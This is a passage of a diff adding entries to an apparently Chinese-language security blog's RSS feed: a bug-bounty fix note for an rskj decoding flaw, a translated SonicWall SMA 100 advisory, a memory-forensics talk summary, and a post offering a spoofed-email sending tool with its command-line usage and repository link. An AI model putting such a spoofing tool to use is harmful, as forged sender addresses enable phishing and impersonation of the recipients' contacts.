+&lt;li&gt;UDPv6端口5050停止处理入站流量&lt;/li&gt;
+&lt;li&gt;最终导致内存耗尽崩溃&lt;/li&gt;
+&lt;li&gt;由于&lt;code&gt;decode2&lt;/code&gt;函数的广泛使用，可能影响其他服务入口点&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;修复方案&#34;&gt;修复方案
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;限制&lt;code&gt;bytesToLength&lt;/code&gt;仅返回非负值&lt;/li&gt;
+&lt;li&gt;添加长度校验（建议）：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;BYTES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(...);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;修复提交&#34;&gt;修复提交
+&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/rsksmart/rskj/commit/6965fa60f743d911ee106b542cec80a1417266b1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/rsksmart/rskj/commit/6965fa60f743d911ee106b542cec80a1417266b1&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞奖励&#34;&gt;漏洞奖励
+&lt;/h2&gt;&lt;p&gt;$5,000&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Python与PHP实现的伪造邮件发送工具(SEMS)</title>
+        <link>http://localhost:1313/p/python%E4%B8%8Ephp%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E5%B7%A5%E5%85%B7sems/</link>
+        <pubDate>Sat, 02 Aug 2025 20:03:36 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/python%E4%B8%8Ephp%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E5%B7%A5%E5%85%B7sems/</guid>
+        <description>&lt;h1 id=&#34;python-php-伪造邮件发送工具sems&#34;&gt;[Python] [PHP] 伪造邮件发送工具(SEMS)
+&lt;/h1&gt;&lt;p&gt;今天我要向大家展示另一个我在空闲时间完成的趣味项目——伪造邮件发送工具。与其他工具不同，该工具使用PHP mail()函数处理邮件，因此需要支持PHP mail()功能的主机服务来托管邮件处理器。&lt;/p&gt;
+&lt;h2 id=&#34;使用前准备&#34;&gt;使用前准备
+&lt;/h2&gt;&lt;p&gt;在使用此工具前，您需要将mailhandler文件夹中的两个文件(index.php和send.php)托管在支持PHP mail()功能的主机服务上。否则该工具将无法工作。&lt;/p&gt;
+&lt;p&gt;完成后，工具会要求输入邮件处理器URL(仅首次使用时)。您需要复制已托管的send.php文件URL并粘贴到输入框中。&lt;/p&gt;
+&lt;h2 id=&#34;工具使用方法&#34;&gt;工具使用方法
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usage: python3 sems.py [-h] [--sN SN] [--sE SE] [--rE RE] [--sub SUB] [--msg MSG]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Simple Port Scanner for scanning TCP ports in target hosts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;optional arguments:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -h, --help  show this help message and exit
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --sN SN     Sender Name (Eg: &amp;#34;John Cena&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --sE SE     Sender E-Mail Address (Eg: johncena@wwe.com)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --rE RE     Recipient E-Mail Address (Eg: chan.96@gmail.com)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --sub SUB   Type Subject (Eg: &amp;#34;See Me Chan&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --msg MSG   Type Message (Eg: &amp;#34;You can see me brother. I know that.&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;希望您会喜欢我的代码。此工具可自由修改，您可以按需进行任何更改。我已为此创建了GitHub仓库。&lt;/p&gt;
+&lt;p&gt;您可以通过以下链接查看和下载：
+&lt;a class=&#34;link&#34; href=&#34;https://github.com/clasiru/Spoofed_E-Mail_Sender&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/clasiru/Spoofed_E-Mail_Sender&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>SonicWall SMA 100系列管理界面多重漏洞可能导致远程代码执行</title>
+        <link>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E5%A4%9A%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
+        <pubDate>Sat, 02 Aug 2025 19:42:30 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E5%A4%9A%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
+        <description>&lt;h1 id=&#34;sonicwall-secure-mobile-access-sma-100系列管理界面多重漏洞可能导致远程代码执行&#34;&gt;SonicWall Secure Mobile Access (SMA) 100系列管理界面多重漏洞可能导致远程代码执行
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;MS-ISAC公告编号&lt;/strong&gt;：2025-046&lt;br&gt;
+&lt;strong&gt;发布日期&lt;/strong&gt;：2025/05/05&lt;/p&gt;
+&lt;h2 id=&#34;概述&#34;&gt;概述
+&lt;/h2&gt;&lt;p&gt;SonicWall Secure Mobile Access (SMA) 100管理界面发现多个安全漏洞，可能导致远程代码执行。SonicWall SMA是企业用于提供远程应用访问的统一安全网关。攻击者组合利用这些漏洞可实现远程代码执行，进而导致会话劫持和系统完全沦陷。&lt;/p&gt;
+&lt;h2 id=&#34;威胁情报&#34;&gt;威胁情报
+&lt;/h2&gt;&lt;p&gt;WatchTowr报告显示CVE-2024-38475和CVE-2023-44221已在真实攻击中被利用。CISA已将这两个漏洞列入已知被利用漏洞目录(KEV)。&lt;/p&gt;
+&lt;h2 id=&#34;受影响系统&#34;&gt;受影响系统
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;SMA 200&lt;/li&gt;
+&lt;li&gt;SMA 210&lt;/li&gt;
+&lt;li&gt;SMA 400&lt;/li&gt;
+&lt;li&gt;SMA 410&lt;/li&gt;
+&lt;li&gt;SMA 500v&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;风险等级&#34;&gt;风险等级
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;政府机构：中大型政府实体(高危)/小型政府实体(中危)&lt;/li&gt;
+&lt;li&gt;企业：中大型企业(高危)/小型企业(中危)&lt;/li&gt;
+&lt;li&gt;家庭用户：低危&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;p&gt;漏洞详情如下：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击策略&lt;/strong&gt;：初始访问(TA0001)&lt;br&gt;
+&lt;strong&gt;技术手段&lt;/strong&gt;：利用公开应用漏洞(T1190)：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;SMA100 SSL-VPN管理界面存在特殊元素过滤不当漏洞，具有管理员权限的远程攻击者可注入任意命令(CVE-2023-44221)&lt;/li&gt;
+&lt;li&gt;Apache HTTP Server 2.4.59及更早版本的mod_rewrite存在输出转义缺陷，攻击者可映射URL到服务器允许访问的文件系统位置(CVE-2024-38475)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;组合利用这些漏洞可实现远程代码执行。&lt;/p&gt;
+&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;立即应用补丁&lt;/strong&gt;：测试后立即安装SonicWall提供的更新(M1051)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保障措施7.1：建立并维护漏洞管理流程&lt;/li&gt;
+&lt;li&gt;保障措施7.2：建立基于风险的修复策略&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;自动化漏洞管理&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保障措施7.4：每月执行自动化应用补丁管理&lt;/li&gt;
+&lt;li&gt;保障措施7.5：每季度执行自动化漏洞扫描&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;网络架构加固&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保障措施12.1：保持网络基础设施更新&lt;/li&gt;
+&lt;li&gt;保障措施12.2：建立安全网络架构&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;渗透测试&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保障措施18.1：建立渗透测试计划&lt;/li&gt;
+&lt;li&gt;保障措施18.2：定期执行外部渗透测试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保障措施4.7：管理默认账户&lt;/li&gt;
+&lt;li&gt;保障措施5.5：维护服务账户清单&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;应用防护&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;保障措施16.13：执行应用渗透测试&lt;/li&gt;
+&lt;li&gt;保障措施10.5：启用防漏洞利用功能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cisa.gov/news-events/alerts/2025/05/01/cisa-adds-two-known-exploited-vulnerabilities-catalog&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CISA公告&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38475&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CVE-2024-38475&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44221&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CVE-2023-44221&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2023-0018&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SonicWall安全公告&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>内存取证实战 | 网络安全与蓝队技术解析</title>
+        <link>http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AE%9E%E6%88%98-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
+        <pubDate>Sat, 02 Aug 2025 18:58:56 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AE%9E%E6%88%98-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;直播内容概要&#34;&gt;直播内容概要
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;主题&lt;/strong&gt;：内存取证技术在网络安全与蓝队行动中的应用&lt;br&gt;
+&lt;strong&gt;技术要点&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;内存取证基础原理与实战价值&lt;/li&gt;
+&lt;li&gt;使用工具分析内存转储中的恶意活动痕迹&lt;/li&gt;
+&lt;li&gt;蓝队视角下的入侵检测与响应技术&lt;/li&gt;
+&lt;li&gt;真实攻击案例中的内存取证流程演示&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;资源链接&#34;&gt;资源链接
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;视频赞助：https://www.tcm.rocks/Sponsors&lt;/li&gt;
+&lt;li&gt;渗透测试服务：https://tcm-sec.com&lt;/li&gt;
+&lt;li&gt;培训课程：https://academy.tcm-sec.com&lt;/li&gt;
+&lt;li&gt;认证考试：https://certifications.tcm-sec.com&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;推荐技术书籍&#34;&gt;推荐技术书籍
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;《渗透测试实战指南》&lt;/li&gt;
+&lt;li&gt;《黑客攻防技术宝典：Web实战篇》&lt;/li&gt;
+&lt;li&gt;《Python黑帽编程》&lt;/li&gt;
+&lt;li&gt;《Linux黑客基础教程》&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
         <title>网络安全的核心在于人：2022年网络安全意识月回顾</title>
         <link>http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B8%E5%BF%83%E5%9C%A8%E4%BA%8E%E4%BA%BA2022%E5%B9%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E6%9C%88%E5%9B%9E%E9%A1%BE/</link>
         <pubDate>Sat, 02 Aug 2025 18:42:53 +0800</pubDate>
